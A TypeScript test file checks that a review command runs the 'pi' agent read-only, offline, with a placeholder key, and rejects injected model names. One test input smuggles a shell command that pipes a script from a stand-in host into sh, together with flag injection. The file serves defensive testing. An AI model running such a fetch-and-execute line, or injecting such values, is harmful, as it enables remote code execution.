import { describe, expect, it } from "vitest";
import { PLACEHOLDER_API_KEY } from "./agent-command";
import {
  PI_AGENT_DIR,
  PI_VERSION,
  buildReviewCommand,
  piModelsConfig,
} from "./review-command";

describe("buildReviewCommand", () => {
  const hostile = "$(curl evil.test | sh); `id` --tools bash\n--model x";
  const { command, env } = buildReviewCommand({
    prompt: hostile,
    model: "gpt-5.4-nano",
  });

  it("runs pi 1.5.0 read-only with no session and no extensions, in JSON mode", () => {
    expect(PI_VERSION).toBe("1.5.0");
    expect(command.slice(0, 3)).toEqual(["timeout", "--kill-after=15", "900"]);
    expect(command[3]).toBe("pi");
    expect(command[command.indexOf("--tools") + 1]).toBe("read,ls,grep,find");
    for (const flag of ["--no-session", "--no-extensions", "--no-mcp"]) {
      expect(command).toContain(flag);
    }
    expect(command[command.indexOf("--mode") + 1]).toBe("json");
    expect(command[command.indexOf("--provider") + 1]).toBe("openai");
    expect(command[command.indexOf("--model") + 1]).toBe("gpt-5.4-nano");
  });

  it("offers no tool that can write or run commands", () => {
    const tools = command[command.indexOf("--tools") + 1]!.split(",");
    for (const banned of ["bash", "edit", "write"]) {
      expect(tools).not.toContain(banned);
    }
  });

  it("passes the prompt as one argv element after --, never interpolated", () => {
    const dash = command.lastIndexOf("--");
    expect(command.slice(dash)).toEqual(["--", hostile]);
    expect(command.filter((a) => a === hostile)).toHaveLength(1);
    expect(command.slice(0, dash).join(" ")).not.toContain("curl");
  });

  it("sets only a placeholder key and keeps pi offline", () => {
    expect(env.OPENAI_API_KEY).toBe(PLACEHOLDER_API_KEY);
    expect(env.PI_OFFLINE).toBe("1");
    expect(env.PI_TELEMETRY).toBe("0");
    expect(env.PI_CODING_AGENT_DIR).toBe(PI_AGENT_DIR);
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(JSON.stringify(env)).not.toMatch(/sk-/);
  });

  it("rejects model names that could add flags or shell syntax", () => {
    for (const model of ["", "--x", "a b", "a;b", "$(x)", "a".repeat(65)]) {
      expect(() => buildReviewCommand({ prompt: "p", model })).toThrow();
    }
  });
});

describe("piModelsConfig", () => {
  it("caps the output tokens pi asks for at the egress limit", () => {
    expect(JSON.parse(piModelsConfig("gpt-5.4-nano"))).toEqual({
      providers: {
        openai: { modelOverrides: { "gpt-5.4-nano": { maxTokens: 16000 } } },
      },
    });
  });
});
